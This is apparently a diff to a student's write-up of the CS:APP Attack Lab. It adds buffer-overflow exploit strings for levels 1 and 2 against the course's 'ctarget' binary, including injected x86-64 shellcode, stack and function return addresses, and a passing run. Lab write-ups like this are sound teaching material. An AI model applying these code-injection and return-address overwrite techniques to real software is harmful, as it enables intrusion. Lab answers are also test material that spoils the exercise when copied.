@@ -77,7 +77,7 @@ at address `0x4017c0`. So our level 1 task is to let `<getbuf>` return to addres
   (gdb) layout asm
   (gdb) layout regs
 ```
-The `-q` parameter is used to skip network related operations in `ctarget, which
+The `-q` parameter is used to skip network related operations in `ctarget`, and
 you can run `ctarget -h` to view the concrete description of all valid parameters.
 Then we use `si` to monitor the program by instruction. We can see that every time
 a `callq` is executed, the address of the next instruction of `callq` will be pushed
@@ -111,16 +111,15 @@ to reach `0x5561dca0`.
 ```
 According to the disassembled code, `<getbuf>` applies 40 bytes to stack, which means
 that we need to first inject 40 bytes to occupy the stack of `<getbuf>` and then followed
-by 8 bytes of address for `<touch1>` for the `retq` to redirect. Attention before the
-end of our exploit, `00` is not allowed as it indicates end of C string. One possible
-solution can be
+by 8 bytes of address for `<touch1>` for the `retq` to redirect. One possible solution can
+be
 ```
-  66 75 63 6b 47 46 57 21
-  66 75 63 6b 47 46 57 21
-  66 75 63 6b 47 46 57 21
-  66 75 63 6b 47 46 57 21
-  66 75 63 6b 47 46 57 21
-  C0 17 40 00 00 00 00 00
+  00 00 00 00 00 00 00 00    /* stack space occupation */
+  00 00 00 00 00 00 00 00    /* stack space occupation */
+  00 00 00 00 00 00 00 00    /* stack space occupation */
+  00 00 00 00 00 00 00 00    /* stack space occupation */
+  00 00 00 00 00 00 00 00    /* stack space occupation */
+  C0 17 40 00 00 00 00 00    /* the address of <touch1> */
 ```
 Let's put the solution to file `ctarget.exploit.l1.txt`, and we can validate it by
 executing from the following command `/src`
@@ -133,7 +132,7 @@ executing from the following command `/src`
 ```
 
 ### Level 2
-The task of level 2 is to redirect `<getbuf>` to `<touch2>`
+The task of level 2 is to redirect `<getbuf>` to `<touch2>`.
 ```c
 void touch2(unsigned val)
 {
@@ -146,7 +145,47 @@ void touch2(unsigned val)
         fail(2);
     }
     exit(0);
- }
+}
+```
+Moreover, we must make it appear to `<touch2>` as if our cookie `0x59b997fa` is passed to it.
+Note that the first argument to a function is passed in register `%rdi`, we have to redirect
+the `<getbuf>` to an address storing code of the following:
+```
+  mov $0x59b997fa,%rdi  # assign cookie value to register rdi
+  retq                  # go to <touch2>
+```
+Let's put the assembly code to a file `ctarget.code.l2.s` and obtain its machine code
+```
+  03-Attack-Lab/src > gcc -c ctarget.code.l2.s
+  03-Attack-Lab/src > objdump -d ctarget.code.l2.o > ctarget.code.l2.d
+  03-Attack-Lab/src > cat ctarget.code.l2.d
+    ctarget.code.l2.o:     file format elf64-x86-64
+    Disassembly of section .text:
+    0000000000000000 <.text>:
+       0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
+       7:   c3                      retq
+```
+Following the address redirection in the previous task, we will first redirect `<getbuf>` to
+the stack address where we put the machine code above. Here, we put this machine code to the
+stack bottom of `<getbuf>`, which is `0x5561dc78`. Second, we will further append the
+address of `<touch2>`, which is `0x4017ec` to the stack address that `retq` in our injected
+code will head to. In this case, our solution for level 2 will be:
+```
+  48 c7 c7 fa 97 b9 59 c3    /* injected code */
+  00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  78 dc 61 55 00 00 00 00    /* the address of injected code */
+  ec 17 40 00 00 00 00 00    /* the address of <touch2> */
+```
+Put the above exploit to file `ctarget.exploit.l2.txt` and execute it:
+```
+  03-Attack-Lab/src > cat ctarget.exploit.l2.txt | ./hex2raw | ./ctarget -q
+    Cookie: 0x59b997fa
+    Type string:Touch2!: You called touch2(0x59b997fa)
+    Valid solution for level 2 with target ctarget
+    PASS: ...
 ```
 
 ### Level 3
